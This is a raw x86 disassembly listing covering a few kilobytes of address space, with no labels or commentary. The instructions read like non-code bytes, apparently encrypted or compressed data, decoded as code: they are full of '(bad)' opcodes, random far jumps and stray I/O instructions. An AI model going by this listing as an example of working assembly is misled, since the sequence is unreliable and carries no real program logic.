  41b0d5:	adc    ebp,DWORD PTR [ecx+0x314e7470]
  41b0db:	lods   al,BYTE PTR ds:[esi]
  41b0dc:	les    eax,FWORD PTR [edx+ebp*4+0xf]
  41b0e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0e1:	bound  ebp,QWORD PTR [ecx-0x65475b09]
  41b0e7:	jmp    0xd01ee02c
  41b0ec:	mov    es,WORD PTR [eax]
  41b0ee:	test   eax,0x2cb1b255
  41b0f3:	sbb    al,0x13
  41b0f5:	add    ch,BYTE PTR [edx-0x41709bfb]
  41b0fb:	pop    esp
  41b0fc:	(bad)  
  41b0fe:	cmp    eax,0x8d636e34
  41b103:	into   
  41b104:	int3   
  41b105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b106:	dec    esi
  41b107:	or     DWORD PTR [ebp-0x555cb2dd],ecx
  41b10d:	jns    0x41b12c
  41b10f:	sti    
  41b110:	add    al,0xf5
  41b112:	packuswb mm7,QWORD PTR [edi]
  41b115:	out    0xc5,al
  41b117:	add    eax,0x9fee5f00
  41b11c:	mov    eax,ds:0xb3c1693e
  41b121:	repz or eax,0xabe24bc
  41b127:	xchg   ebx,eax
  41b128:	sub    esi,DWORD PTR [di-0x64]
  41b12c:	cmp    eax,0xd855bc6f
  41b131:	xchg   edx,eax
  41b132:	or     al,0x67
  41b134:	stos   BYTE PTR es:[edi],al
  41b135:	cmp    al,0x45
  41b137:	mov    edi,0xc1e3e7c1
  41b13c:	push   esp
  41b13d:	xor    eax,0x24dde007
  41b142:	sahf   
  41b143:	cmp    ah,BYTE PTR [eax+0x1de1de93]
  41b149:	pop    es
  41b14a:	sbb    DWORD PTR cs:[esi-0x4f],ecx
  41b14e:	inc    edi
  41b14f:	cmp    BYTE PTR [edi],bl
  41b151:	test   bl,0xe8
  41b154:	add    al,dl
  41b156:	dec    ebp
  41b157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b158:	or     BYTE PTR [ecx-0x7cb8f19e],dl
  41b15e:	retf   0xe325
  41b161:	push   edx
  41b162:	aam    0x38
  41b164:	icebp  
  41b165:	jecxz  0x41b182
  41b167:	adc    al,0xb7
  41b169:	leave  
  41b16a:	stos   DWORD PTR es:[edi],eax
  41b16b:	retf   
  41b16c:	repz iret 
  41b16e:	cmp    eax,0xb44eba58
  41b173:	mov    WORD PTR [ebp-0x7e43a141],es
  41b179:	jmp    0x41b1c1
  41b17b:	jns    0x41b109
  41b17d:	shr    BYTE PTR [edi-0xf8d9fc0],cl
  41b183:	into   
  41b184:	int3   
  41b185:	sub    al,0x3
  41b187:	aam    0x77
  41b189:	nop
  41b18a:	dec    ecx
  41b18b:	push   0xffffffd8
  41b18d:	add    BYTE PTR ds:0x8afe35dc,0x94
  41b194:	pop    ebp
  41b195:	add    eax,0x8baa45c7
  41b19a:	cmc    
  41b19b:	lahf   
  41b19c:	leave  
  41b19d:	sub    al,0xd2
  41b19f:	adc    al,0x80
  41b1a1:	cmp    eax,0x4b0b8073
  41b1a6:	mov    bl,ch
  41b1a8:	stos   DWORD PTR es:[edi],eax
  41b1a9:	lods   eax,DWORD PTR ds:[esi]
  41b1aa:	pop    ds
  41b1ab:	(bad)  
  41b1ad:	mov    bh,0x71
  41b1af:	outs   dx,BYTE PTR ds:[esi]
  41b1b0:	mov    eax,ds:0xdef8d980
  41b1b5:	das    
  41b1b6:	aaa    
  41b1b7:	lds    esi,FWORD PTR [eax-0x50]
  41b1ba:	fadd   DWORD PTR [ecx]
  41b1bc:	adc    DWORD PTR [esp+ebp*4+0x70],0x1587b4e
  41b1c4:	and    ebp,DWORD PTR [edx]
  41b1c6:	inc    edi
  41b1c7:	adc    al,0xd2
  41b1c9:	lods   al,BYTE PTR ds:[esi]
  41b1ca:	dec    esp
  41b1cb:	adc    al,0xeb
  41b1cd:	xlat   BYTE PTR ds:[ebx]
  41b1ce:	ret    0xea56
  41b1d1:	push   0xfc32eebd
  41b1d6:	push   es
  41b1d7:	les    edi,FWORD PTR [ebx+edi*2-0x159973e1]
  41b1de:	hlt    
  41b1df:	outs   dx,BYTE PTR ds:[si]
  41b1e1:	ret    
  41b1e2:	xchg   esp,eax
  41b1e3:	mov    eax,ds:0x8141190f
  41b1e8:	ja     0x41b250
  41b1ea:	inc    ebx
  41b1eb:	in     al,0xb8
  41b1ed:	cmp    DWORD PTR [eax-0x7843336e],ebp
  41b1f3:	pop    ds
  41b1f4:	mov    ecx,0x912a9c91
  41b1f9:	(bad)  
  41b1fa:	pusha  
  41b1fb:	jle    0x41b26d
  41b1fd:	loopne 0x41b25e
  41b1ff:	push   ds
  41b200:	popf   
  41b201:	xor    al,0x42
  41b203:	xor    DWORD PTR [ebx-0x4ec43650],ebx
  41b209:	jmp    0xcfc8:0x14b82126
  41b210:	mov    bh,0xbb
  41b212:	xchg   DWORD PTR [edx],ecx
  41b214:	push   ebp
  41b215:	sub    DWORD PTR [ecx],esp
  41b217:	std    
  41b218:	ins    BYTE PTR es:[edi],dx
  41b219:	fwait
  41b21a:	xor    ebp,ebx
  41b21c:	jmp    0xc9c3:0xc75a587a
  41b223:	mov    ds:0xebc1abb1,al
  41b228:	outs   dx,DWORD PTR ds:[esi]
  41b229:	adc    al,0xe9
  41b22b:	loopne 0x41b27c
  41b22d:	mov    dl,0x1e
  41b22f:	scas   al,BYTE PTR es:[edi]
  41b230:	jns    0x41b259
  41b232:	stos   DWORD PTR es:[edi],eax
  41b233:	xchg   esi,eax
  41b234:	add    eax,0xc1c75e87
  41b239:	sbb    edi,DWORD PTR [ebx+edi*1+0x62]
  41b23d:	dec    ecx
  41b23e:	(bad)
  41b241:	jbe    0x41b1e4
  41b243:	inc    edi
  41b244:	mov    dl,BYTE PTR ds:0xd24eb5f
  41b24a:	ins    DWORD PTR es:[edi],dx
  41b24b:	add    bh,BYTE PTR [esi]
  41b24d:	sbb    bh,BYTE PTR [edx+ecx*8]
  41b250:	js     0x41b2ab
  41b252:	inc    ecx
  41b253:	fwait
  41b254:	cmp    ebp,DWORD PTR [ebx+0x628f1260]
  41b25a:	out    dx,al
  41b25b:	jo     0x41b25c
  41b25d:	inc    edx
  41b25e:	mov    ebp,0x9f44d6d4
  41b263:	push   ebp
  41b264:	mov    eax,0x6069c365
  41b269:	push   eax
  41b26a:	dec    edx
  41b26b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b26c:	sbb    al,0x66
  41b26e:	popf   
  41b26f:	(bad)  
  41b270:	das    
  41b271:	(bad)  
  41b272:	push   esi
  41b273:	mov    ebp,0x69b85bdb
  41b278:	xchg   ebx,eax
  41b279:	sbb    cl,dl
  41b27b:	dec    ecx
  41b27c:	enter  0xd2e,0x15
  41b280:	loope  0x41b2f7
  41b282:	sub    dh,ch
  41b284:	in     al,0xf5
  41b286:	rcr    BYTE PTR [edx-0x33],cl
  41b289:	pop    edx
  41b28a:	push   0x5b
  41b28c:	xor    eax,0x276ba8d9
  41b291:	mov    es,WORD PTR [ecx+ebx*4+0x3e]
  41b295:	cdq    
  41b296:	jle    0x41b2ca
  41b298:	inc    ebx
  41b299:	cld    
  41b29a:	test   DWORD PTR [esi],0xedf7b038
  41b2a0:	dec    edi
  41b2a1:	push   esi
  41b2a2:	push   ss
  41b2a3:	es loope 0x41b2ea
  41b2a6:	repz sub al,al
  41b2a9:	outs   dx,BYTE PTR ds:[esi]
  41b2aa:	lahf   
  41b2ab:	add    eax,0x89f0240a
  41b2b0:	jo     0x41b306
  41b2b2:	addr16 xchg edi,eax
  41b2b4:	pusha  
  41b2b5:	sub    DWORD PTR [ebp+0x14],edx
  41b2b8:	(bad)  [eax]
  41b2ba:	mov    edx,edi
  41b2bc:	xchg   ebp,eax
  41b2bd:	imul   edx,DWORD PTR [ebp-0x232613c8],0x7ee39dc4
  41b2c7:	mov    ecx,0xda0ea134
  41b2cc:	push   ecx
  41b2cd:	out    dx,eax
  41b2ce:	mov    al,ds:0xbccb8014
  41b2d3:	loopne 0x41b30a
  41b2d5:	sub    eax,0xec852afd
  41b2da:	fsub   st(7),st
  41b2dc:	in     al,0x3f
  41b2de:	aam    0x57
  41b2e0:	call   0x75d9b09a
  41b2e5:	fstp   st(1)
  41b2e7:	idiv   DWORD PTR [ecx-0x286f9b16]
  41b2ed:	outs   dx,DWORD PTR ds:[esi]
  41b2ee:	or     al,0x3
  41b2f0:	lds    edx,FWORD PTR [ebx]
  41b2f2:	dec    edx
  41b2f3:	retf   
  41b2f4:	sub    al,ch
  41b2f6:	jnp    0x41b35c
  41b2f8:	xor    esp,DWORD PTR [edi+0x22]
  41b2fb:	xchg   edi,eax
  41b2fc:	inc    edx
  41b2fd:	daa    
  41b2fe:	xor    eax,0xe702b003
  41b303:	shr    DWORD PTR [ebx],0x6b
  41b306:	clc    
  41b307:	push   ds
  41b308:	pop    edx
  41b309:	outs   dx,BYTE PTR ds:[esi]
  41b30a:	mov    WORD PTR [eax+0x4ca5e264],?
  41b310:	pop    edx
  41b311:	mov    bl,0x4b
  41b313:	push   esi
  41b314:	xchg   BYTE PTR [ebx-0x3454050a],al
  41b31a:	gs jmp 0xebab:0xed322599
  41b322:	xchg   BYTE PTR [ebp-0x58668272],bh
  41b328:	sbb    ecx,DWORD PTR [esi]
  41b32a:	int    0xa1
  41b32c:	(bad)  
  41b32d:	and    ecx,edx
  41b32f:	gs jno 0x41b2e8
  41b332:	fild   QWORD PTR [ebx+0x0]
  41b335:	and    al,0x7c
  41b337:	out    dx,eax
  41b338:	push   ds
  41b339:	pop    edi
  41b33a:	(bad)  
  41b33b:	lods   eax,DWORD PTR ds:[esi]
  41b33c:	mov    BYTE PTR cs:[ecx-0x7334e1d1],dl
  41b343:	sar    DWORD PTR [esi-0x4b],cl
  41b346:	outs   dx,BYTE PTR ds:[esi]
  41b347:	ins    DWORD PTR es:[edi],dx
  41b348:	jecxz  0x41b32b
  41b34a:	sti    
  41b34b:	and    BYTE PTR [esi+0x5187059b],dl
  41b351:	ja     0x41b385
  41b353:	push   edi
  41b354:	add    ah,BYTE PTR [ebx+0x59]
  41b357:	pop    ebp
  41b358:	push   esi
  41b359:	jno    0x41b3a4
  41b35b:	sbb    al,0xdd
  41b35d:	fsubr  QWORD PTR ds:0x3f9defc4
  41b363:	fdiv   DWORD PTR [edi-0x5956b60d]
  41b369:	mov    ?,WORD PTR [edi+0x52]
  41b36c:	sbb    bl,BYTE PTR [ebp+0x7b]
  41b36f:	jg     0x41b3df
  41b371:	jmp    0xdf0caf2b
  41b376:	in     eax,0x5d
  41b378:	push   ds
  41b379:	outs   dx,DWORD PTR ds:[esi]
  41b37a:	mov    eax,ds:0xeb0efaf0
  41b37f:	fild   WORD PTR [ebx+0x20]
  41b382:	or     al,0x31
  41b384:	jmp    0x7998:0x712c23d6
  41b38b:	retf   0xa15
  41b38e:	stc    
  41b38f:	sahf   
  41b390:	out    dx,eax
  41b391:	cmp    al,0x6b
  41b393:	pop    edi
  41b394:	jmp    0x41b38a
  41b396:	mov    eax,ds:0xbc43913c
  41b39b:	out    0x7f,eax
  41b39d:	sbb    al,0x1f
  41b39f:	jns    0x41b404
  41b3a1:	mov    eax,0x957837a6
  41b3a6:	push   ss
  41b3a7:	mov    eax,ds:0x79c172b9
  41b3ac:	jo     0x41b402
  41b3ae:	add    DWORD PTR [edi],eax
  41b3b0:	cmp    eax,0x27d7ffc2
  41b3b5:	and    eax,0x6299faeb
  41b3ba:	dec    ebp
  41b3bb:	jno    0x41b3ad
  41b3bd:	mov    ds:0xdc6d9e3d,eax
  41b3c2:	ror    BYTE PTR [edi-0x70e39889],1
  41b3c8:	int    0x69
  41b3ca:	test   al,0x8b
  41b3cc:	mov    DWORD PTR [ecx],edi
  41b3ce:	push   0xcf7b5fa4
  41b3d3:	(bad)  
  41b3d4:	push   es
  41b3d5:	mov    ds:0x9516939f,al
  41b3da:	ror    DWORD PTR ds:0x9dfb18a0,cl
  41b3e0:	dec    ebp
  41b3e1:	scas   al,BYTE PTR es:[edi]
  41b3e2:	mov    cs,esi
  41b3e4:	int    0xa9
  41b3e6:	jb     0x41b437
  41b3e8:	pop    ds
  41b3e9:	sbb    al,0x62
  41b3eb:	inc    ebp
  41b3ec:	push   ebx
  41b3ed:	(bad)  
  41b3ee:	std    
  41b3ef:	icebp  
  41b3f0:	lods   al,BYTE PTR ds:[esi]
  41b3f1:	scas   eax,DWORD PTR es:[edi]
  41b3f2:	ins    DWORD PTR es:[edi],dx
  41b3f3:	cmp    bh,ch
  41b3f5:	(bad)  
  41b3f6:	test   al,0xa
  41b3f8:	mov    edx,0x7715ea71
  41b3fd:	(bad)  
  41b3fe:	xchg   ecx,eax
  41b3ff:	inc    ebp
  41b400:	xor    ebx,edx
  41b402:	stc    
  41b403:	call   0x2c267952
  41b408:	inc    esp
  41b409:	aaa    
  41b40a:	cs or  dl,ah
  41b40d:	into   
  41b40e:	popa   
  41b40f:	or     eax,0x8cc5c53b
  41b414:	mov    BYTE PTR [ecx-0x70],0x99
  41b418:	call   0x1af268e2
  41b41d:	mov    ecx,0x175d7648
  41b422:	jle    0x41b3a6
  41b424:	mov    ebx,0x9727c976
  41b429:	popf   
  41b42a:	bound  esp,QWORD PTR [ebx-0x5aed2616]
  41b430:	and    ch,dh
  41b432:	lods   al,BYTE PTR ds:[esi]
  41b433:	mov    edi,esp
  41b435:	and    ecx,eax
  41b437:	jl     0x41b412
  41b439:	dec    esi
  41b43a:	icebp  
  41b43b:	cmp    al,0xe7
	...
  41b615:	jecxz  0x41b636
  41b617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b618:	adc    al,0xfe
  41b61a:	mov    ebp,0x9faffff3
  41b61f:	test   ah,0xcf
  41b622:	mov    edi,0x36dbecb9
  41b627:	add    DWORD PTR [eax],eax
  41b629:	and    BYTE PTR [edi],al
  41b62b:	add    BYTE PTR [eax],al
  41b62d:	repnz add DWORD PTR [esi+0x396abb92],ecx
  41b634:	inc    eax
  41b635:	ds add eax,0xcddb0866
  41b63b:	mov    ebx,0xb6ecf8ec
  41b640:	jmp    0xb393:0xfb518bf
  41b647:	push   ss
  41b648:	imul   ebp,DWORD PTR ds:0xe60c5da6,0xe74064c7
  41b652:	cmp    al,0x72
  41b655:	cdq    
  41b656:	xchg   BYTE PTR [ebp+0x49e5eb45],al
  41b65c:	mov    al,0xde
  41b65e:	lahf   
  41b65f:	test   eax,0xba96695b
  41b664:	ja     0x41b69f
  41b666:	ins    DWORD PTR es:[edi],dx
  41b667:	cld    
  41b668:	jge    0x41b639
  41b66a:	add    ecx,edi
  41b66c:	sub    dl,ah
  41b66e:	mov    fs,WORD PTR [edi+0xe84abf4]
  41b674:	fwait
  41b675:	adc    edx,DWORD PTR [esi+0x1b946790]
  41b67b:	and    al,0x1b
  41b67d:	jnp    0x41b62b
  41b67f:	cmc    
  41b680:	and    edi,DWORD PTR [ebx+edi*1-0x2]
  41b684:	ja     0x41b6c3
  41b686:	pop    ds
  41b687:	out    dx,al
  41b688:	retf   
  41b689:	sub    esp,edi
  41b68b:	shl    DWORD PTR [eax-0x13],1
  41b68e:	scas   al,BYTE PTR es:[edi]
  41b68f:	and    DWORD PTR [eax],edx
  41b691:	or     al,BYTE PTR gs:[ecx+0x36368ca9]
  41b698:	dec    ebx
  41b699:	xchg   edi,eax
  41b69a:	rol    DWORD PTR [edx+0x4d],1
  41b69d:	push   cs
  41b69e:	cli    
  41b69f:	mov    bh,0xc4
  41b6a1:	call   0x5b56e5d
  41b6a6:	js     0x41b6c3
  41b6a8:	sub    BYTE PTR [edx+0x20a1a7ff],cl
  41b6ae:	push   ss
  41b6af:	test   al,0x3c
  41b6b1:	repz or dh,BYTE PTR [ebp+0x5f]
  41b6b5:	adc    al,0xe0
  41b6b7:	cmp    al,0x5b
  41b6b9:	jae    0x41b6d2
  41b6bb:	sbb    ah,ch
  41b6bd:	jne    0x41b6bc
  41b6bf:	stos   DWORD PTR es:[edi],eax
  41b6c0:	push   ss
  41b6c1:	xchg   DWORD PTR [edi+ebx*4],edi
  41b6c4:	xor    edx,edi
  41b6c6:	pop    ds
  41b6c7:	lods   eax,DWORD PTR ds:[esi]
  41b6c8:	aaa    
  41b6c9:	leave  
  41b6ca:	iret   
  41b6cb:	jno    0x41b6ff
  41b6cd:	and    al,0xa
  41b6cf:	nop
  41b6d0:	push   ecx
  41b6d1:	dec    ecx
  41b6d2:	lock xchg ebp,eax
  41b6d4:	push   ebx
  41b6d5:	aam    0xdd
  41b6d7:	cld    
  41b6d8:	je     0x41b73f
  41b6da:	outs   dx,DWORD PTR ds:[esi]
  41b6db:	cwde   
  41b6dc:	add    ecx,DWORD PTR [edx+0x7a]
  41b6df:	sar    DWORD PTR [esp+ecx*1-0xe4a2f51],1
  41b6e6:	and    ebp,DWORD PTR ds:0xa226e0ab
  41b6ec:	mov    dh,0x12
  41b6ee:	pop    ebp
  41b6ef:	enter  0x66c8,0x32
  41b6f3:	mov    ds:0x77ca7d20,al
  41b6f8:	add    BYTE PTR [ebp+0x1f29da89],0x62
  41b6ff:	scas   eax,DWORD PTR es:[edi]
  41b700:	pop    ss
  41b701:	out    0xd8,eax
  41b703:	jecxz  0x41b6cc
  41b705:	ss (bad) 
  41b707:	dec    bp
  41b709:	shl    ch,cl
  41b70b:	add    BYTE PTR [ebp+eiz*1-0x5d],bl
  41b70f:	(bad)  
  41b710:	fiadd  DWORD PTR [ecx-0x50]
  41b713:	jle    0x41b76b
  41b715:	push   0x32473b40
  41b71a:	ins    DWORD PTR es:[edi],dx
  41b71b:	(bad)  
  41b71c:	push   0xee2b2c1e
  41b721:	out    0x79,eax
  41b723:	cmp    esp,DWORD PTR [ebx+ebp*2]
  41b726:	mov    bl,0x17
  41b728:	mov    ch,0xe8
  41b72a:	mov    BYTE PTR [esi+0x8cf0f1f],cl
  41b730:	fist   DWORD PTR [ebp-0x53]
  41b733:	mov    bh,0x8c
  41b735:	(bad)  
  41b736:	(bad)  
  41b737:	cdq    
  41b738:	shr    DWORD PTR [esp+edi*4+0x13],1
  41b73c:	mov    eax,ss
  41b73e:	(bad)  
  41b73f:	push   ecx
  41b740:	mov    ds:0x903a0d83,eax
  41b745:	les    esp,FWORD PTR [esi+0x253a0de6]
  41b74b:	mov    ebx,0x9c0c4ed8
  41b750:	je     0x41b736
  41b752:	repz mov bl,0x80
  41b755:	ror    al,cl
  41b757:	stos   BYTE PTR es:[edi],al
  41b758:	out    dx,eax
  41b759:	outs   dx,DWORD PTR ds:[esi]
  41b75a:	add    dl,cl
  41b75c:	retf   0x26a6
  41b75f:	xor    eax,DWORD PTR ds:0x11202b16
  41b765:	inc    eax
  41b766:	mov    al,0xc0
  41b768:	shl    BYTE PTR [edx+0x39a8a4e9],0x48
  41b76f:	dec    edx
  41b770:	xchg   esi,eax
  41b771:	int3   
  41b772:	in     al,0xee
  41b774:	sub    al,0xd2
  41b776:	sub    eax,0x40e9194a
  41b77b:	sbb    esi,esi
  41b77d:	cld    
  41b77e:	push   esp
  41b77f:	jmp    0x41b7cf
  41b781:	aam    0xdb
  41b783:	pop    esi
  41b784:	sub    DWORD PTR [eax-0x23],edi
  41b787:	jae    0x41b7b0
  41b789:	mov    ebp,0xc481d182
  41b78e:	icebp  
  41b78f:	clc    
  41b790:	mov    ds,WORD PTR [edi]
  41b792:	dec    esp
  41b793:	add    BYTE PTR [ebp-0x43],bl
  41b796:	push   0x7fcb4866
  41b79b:	adc    BYTE PTR [eax+0x40],ah
  41b79e:	fimul  WORD PTR [edi-0x3ab2e01e]
  41b7a4:	out    0x13,eax
  41b7a6:	fild   DWORD PTR [ebp-0x3d83a350]
  41b7ac:	xor    DWORD PTR [ebp-0x2bb22edb],edx
  41b7b2:	(bad)  
  41b7b3:	xchg   esi,eax
  41b7b4:	in     eax,dx
  41b7b5:	scas   eax,DWORD PTR es:[edi]
  41b7b6:	mul    DWORD PTR [edx-0x61]
  41b7b9:	stc    
  41b7ba:	call   0x1182:0xff9f5bcc
  41b7c1:	js     0x41b816
  41b7c3:	scas   al,BYTE PTR es:[edi]
  41b7c4:	adc    BYTE PTR [edi],ch
  41b7c6:	fiadd  WORD PTR [esp+esi*8+0x7607ff10]
  41b7cd:	inc    edi
  41b7ce:	mov    dh,0x10
  41b7d0:	lock clc 
  41b7d2:	sbb    eax,0x767d98f4
  41b7d8:	sub    al,0x2
  41b7da:	xchg   esp,eax
  41b7db:	not    esi
  41b7dd:	inc    DWORD PTR [ebx+0x5c8de72f]
  41b7e3:	stos   DWORD PTR es:[edi],eax
  41b7e4:	test   BYTE PTR [ecx],0x59
  41b7e7:	xor    al,BYTE PTR [edx]
  41b7e9:	inc    eax
  41b7ea:	and    edi,DWORD PTR [ebx]
  41b7ec:	loope  0x41b838
  41b7ee:	push   0xffffffa8
  41b7f0:	cmp    BYTE PTR [ebx-0x382b50fa],0x88
  41b7f7:	(bad)  
  41b7f8:	arpl   WORD PTR [ebx+0x18],dx
  41b7fb:	xor    eax,0x50acedf9
  41b800:	imul   ebp,ecx,0x66
  41b803:	push   esi
  41b804:	cld    
  41b805:	gs enter 0x91e2,0x80
  41b80a:	jbe    0x41b797
  41b80c:	dec    ebx
  41b80d:	push   edx
  41b80e:	pop    ecx
  41b80f:	imul   BYTE PTR [ebp+0x51]
  41b812:	inc    ecx
  41b813:	xchg   ebx,eax
  41b814:	leave  
  41b815:	and    ecx,DWORD PTR [ecx+0x5875c228]
  41b81b:	rol    edx,0x16
  41b81e:	(bad)  
  41b820:	and    ebx,DWORD PTR cs:[ecx]
  41b823:	arpl   WORD PTR [edi+0x76c556d7],di
  41b829:	lods   eax,DWORD PTR ds:[esi]
  41b82a:	lods   al,BYTE PTR ds:[esi]
  41b82b:	sbb    al,0xd1
  41b82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b82e:	repz mov dh,0x8e
  41b831:	push   0xeba2c40a
  41b836:	fmul   DWORD PTR [edx+0x4]
  41b839:	xor    al,0x58
  41b83b:	shr    DWORD PTR [edx+0xc42e0c5],1
  41b841:	out    dx,al
  41b842:	mov    ch,0xcc
  41b844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b845:	clc    
  41b846:	add    bh,ah
  41b848:	shl    esp,1
  41b84a:	cmp    ah,BYTE PTR [edx+ebx*1]
  41b84d:	mov    ?,esp
  41b84f:	js     0x41b811
  41b851:	int3   
  41b852:	int    0x62
  41b854:	aas    
  41b855:	xor    eax,0x8a27791c
  41b85a:	mov    ebx,DWORD PTR [ecx]
  41b85c:	fild   WORD PTR [esi-0x4c]
  41b85f:	pop    edi
  41b860:	sbb    al,0x76
  41b862:	(bad)  
  41b863:	jg     0x41b7f8
  41b865:	jo     0x41b87b
  41b867:	cld    
  41b868:	mov    ch,0x5a
  41b86a:	xor    al,0x7f
  41b86c:	push   esp
  41b86d:	mov    bl,al
  41b86f:	stos   BYTE PTR es:[edi],al
  41b870:	jge    0x41b84e
  41b872:	les    ecx,FWORD PTR [ecx]
  41b874:	sbb    esi,ebx
  41b876:	test   eax,0x6de192fb
  41b87b:	bound  ebx,QWORD PTR [ebp+0x2f641094]
  41b881:	adc    al,0x2
  41b883:	mov    esi,0x77638bbd
  41b888:	inc    eax
  41b889:	mov    bl,0xa3
  41b88b:	dec    eax
  41b88c:	pop    edx
  41b88d:	inc    ecx
  41b88e:	rcl    DWORD PTR ds:0xeaccd68e,0xa4
  41b895:	mov    eax,ds:0x72d6fc62
  41b89a:	add    edi,edx
  41b89c:	and    BYTE PTR [esi-0x57],0x66
  41b8a0:	inc    edi
  41b8a2:	fisub  WORD PTR [eax+0x6326d137]
  41b8a8:	mov    bl,0xc2
  41b8aa:	mov    ebx,DWORD PTR [ebx]
  41b8ac:	lea    ecx,[ebx-0x1e]
  41b8af:	cmp    dh,BYTE PTR [esi+0x1b7987fd]
  41b8b5:	js     0x41b8fb
  41b8b7:	add    dh,BYTE PTR [edx-0x73fbc253]
  41b8bd:	and    al,0xf6
  41b8bf:	std    
  41b8c0:	pop    ecx
  41b8c1:	dec    ebx
  41b8c2:	call   DWORD PTR [ebp+0x3bd09bf2]
  41b8c8:	lods   al,BYTE PTR ds:[esi]
  41b8c9:	cdq    
  41b8ca:	out    0x99,al
  41b8cc:	fcmovne st,st(1)
  41b8ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8cf:	or     BYTE PTR [edx+0x10e77337],dl
  41b8d5:	call   0xe150d7ee
  41b8da:	ss or  eax,0x5dd9d9
  41b8e0:	std    
  41b8e1:	fsub   DWORD PTR [esi+eiz*2]
  41b8e4:	imul   edx,DWORD PTR cs:[edi+0x50c37fbb],0x6d9a7ee0
  41b8ef:	dec    eax
  41b8f0:	(bad)  
  41b8f1:	xor    ch,BYTE PTR [edx]
  41b8f3:	push   edx
  41b8f4:	mov    eax,0x633079c3
  41b8f9:	sub    cl,bl
  41b8fb:	mov    cl,0x7b
  41b8fd:	sub    ecx,eax
  41b8ff:	xchg   DWORD PTR [ecx-0x3a755679],ecx
  41b905:	fwait
  41b906:	lds    ebp,FWORD PTR [esi+0x23f8413e]
  41b90c:	dec    esp
  41b90d:	addr16 popf 
  41b90f:	or     cl,BYTE PTR [eax]
  41b911:	jbe    0x41b954
  41b913:	lock rcr ecx,1
  41b916:	fidivr WORD PTR [ebx-0xd0d939c]
  41b91c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b91d:	push   es
  41b91e:	lea    edi,[edx-0x23339866]
  41b924:	mov    al,ds:0x700693a1
  41b929:	mov    dh,0x24
  41b92b:	ret    0xe225
  41b92e:	call   0xd406:0xfe2460b1
  41b935:	xor    DWORD PTR [ebp+edx*1+0x7d91db01],0xf2b08029
  41b940:	scas   eax,DWORD PTR es:[edi]
  41b941:	add    dh,BYTE PTR ds:0xb462d625
  41b947:	jno    0x41b959
  41b949:	test   BYTE PTR [edx],dl
  41b94b:	sub    BYTE PTR [edi],0x60
  41b94e:	xor    DWORD PTR [esi],edi
  41b950:	xchg   ecx,eax
  41b951:	lds    esi,FWORD PTR [ecx-0x6c]
  41b954:	sbb    dl,ch
  41b956:	mov    ebp,0x25552c1b
  41b95b:	rcr    DWORD PTR [ebp+0x68dd5860],1
  41b961:	pop    ebp
  41b962:	int    0x9b
  41b964:	shl    edx,0xa4
  41b967:	sbb    al,0xd
  41b969:	jle    0x41b9d9
  41b96b:	hlt    
  41b96c:	dec    edi
  41b96d:	ror    DWORD PTR [edi],cl
  41b96f:	mov    ah,0x6
  41b971:	sub    esi,DWORD PTR ds:0xc2a96733
  41b977:	jge    0x41b967
  41b979:	jg     0x41b9b7
  41b97b:	mov    ?,WORD PTR [ebx-0x42]
  41b97e:	pop    es
  41b97f:	jge    0x41b981
  41b981:	shr    BYTE PTR [esi-0x5b546e23],0x9e
  41b988:	std    
  41b989:	aam    0x2d
  41b98b:	mov    eax,ds:0x1cd3d6af
  41b990:	int    0xf4
  41b992:	test   eax,0x58a7c2c6
  41b997:	add    al,0xf5
  41b999:	loop   0x41b9d2
  41b99b:	ss cli 
  41b99d:	cli    
  41b99e:	jge    0x41b9ab
  41b9a0:	dec    esi
  41b9a1:	bound  ebx,QWORD PTR [ecx+0x60921a28]
  41b9a7:	push   DWORD PTR [esi-0x179bd89e]
  41b9ad:	xlat   BYTE PTR ds:[ebx]
  41b9ae:	stos   DWORD PTR es:[edi],eax
  41b9af:	jmp    0x41b96a
  41b9b1:	fsubr  QWORD PTR [edi+esi*4]
  41b9b4:	xor    bl,ch
  41b9b6:	and    al,0x21
  41b9b8:	das    
  41b9b9:	out    0x5d,al
  41b9bb:	mov    al,0xb6
  41b9bd:	test   eax,0x108ece67
  41b9c2:	std    
  41b9c3:	sbb    al,0x8c
  41b9c5:	call   0x459b:0x8e98e32d
  41b9cc:	and    DWORD PTR [eax],ebx
  41b9ce:	cmp    dl,dl
  41b9d0:	arpl   WORD PTR [ebp+0x0],sp
  41b9d3:	outs   dx,BYTE PTR ds:[esi]
  41b9d4:	jo     0x41ba52
  41b9d6:	in     eax,dx
  41b9d7:	ret    
  41b9d8:	push   cs
  41b9d9:	pop    ebp
  41b9da:	gs fwait
  41b9dc:	lods   eax,DWORD PTR ds:[esi]
  41b9dd:	inc    edi
  41b9de:	pop    ecx
  41b9df:	fldenv [edi+0x2bec4dc3]
  41b9e5:	(bad)  
  41b9e6:	in     eax,0x18
  41b9e8:	int    0x1c
  41b9ea:	push   es
  41b9eb:	ss adc eax,0x4e7f36bb
  41b9f1:	icebp  
  41b9f2:	push   ebp
  41b9f3:	imul   esp,DWORD PTR [eax],0x7fff2c3d
  41b9f9:	xor    dl,BYTE PTR [esi+edx*2-0x62]
  41b9fd:	xchg   ebx,eax
  41b9fe:	sub    esp,ebx
  41ba00:	es jo  0x41ba24
  41ba03:	xchg   edi,eax
  41ba04:	mov    eax,edx
  41ba06:	or     al,BYTE PTR [esi]
  41ba08:	pop    eax
  41ba09:	fisttp WORD PTR [edi+edx*1-0x3d]
  41ba0d:	xlat   BYTE PTR ds:[ebx]
  41ba0e:	adc    edi,DWORD PTR [ecx+ebp*8]
  41ba11:	xor    DWORD PTR [edx],esi
  41ba13:	outs   dx,DWORD PTR ds:[esi]
  41ba14:	push   esi
  41ba15:	mov    esi,0x7079638c
  41ba1a:	add    eax,0xb5c4ed46
  41ba1f:	sbb    ecx,esp
  41ba21:	add    eax,0x7080e1d6
  41ba26:	inc    edx
  41ba27:	dec    edx
  41ba28:	push   edi
  41ba29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba2a:	sbb    ecx,DWORD PTR [edx+0x2]
  41ba2d:	(bad)  
  41ba2e:	loop   0x41b9b4
